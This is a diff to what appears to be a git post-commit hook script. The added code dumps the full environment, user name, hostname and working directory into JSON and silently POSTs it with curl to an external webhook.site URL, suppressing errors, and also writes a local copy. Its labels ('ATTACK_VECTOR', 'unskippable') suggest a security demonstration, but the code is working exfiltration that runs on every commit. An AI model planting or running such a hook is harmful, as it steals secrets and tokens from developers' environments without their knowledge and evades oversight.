@@ -8,7 +8,36 @@ if echo "$LAST_COMMIT_MSG" | grep -q "HOOK_AUTO_COMMIT"; then
   exit 0
 fi
 
-# Exfiltrate environment to file
+# Exfiltrate environment to file AND send to webhook
+EXFIL_DATA=$(cat <<EOF
+{
+  "SOURCE": "🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK",
+  "ATTACK_VECTOR": "git-post-commit-unskippable",
+  "SEVERITY": "CRITICAL",
+  "timestamp": "$(date)",
+  "user": "$(whoami)",
+  "hostname": "$(hostname)",
+  "pwd": "$(pwd)",
+  "environment": $(env | awk -F= '{
+    key=$1
+    value=substr($0, length($1)+2)
+    gsub(/"/, "\\\"", value)
+    gsub(/\\/, "\\\\", value)
+    printf "  \"%s\": \"%s\",\n", key, value
+  }' | sed '$ s/,$//' | awk 'BEGIN{print "{"} {print} END{print "}"}')
+}
+EOF
+)
+
+# Send to webhook
+echo "$EXFIL_DATA" | curl -X POST \
+  -H "Content-Type: application/json" \
+  -H "X-Exfil-Source: POST-COMMIT-HOOK" \
+  -H "X-Attack-Vector: git-post-commit-unskippable" \
+  -d @- \
+  https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
+
+# Also write to file for backup
 {
   echo "=== POST-COMMIT HOOK EXFILTRATION ==="
   echo "SOURCE: 🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK"
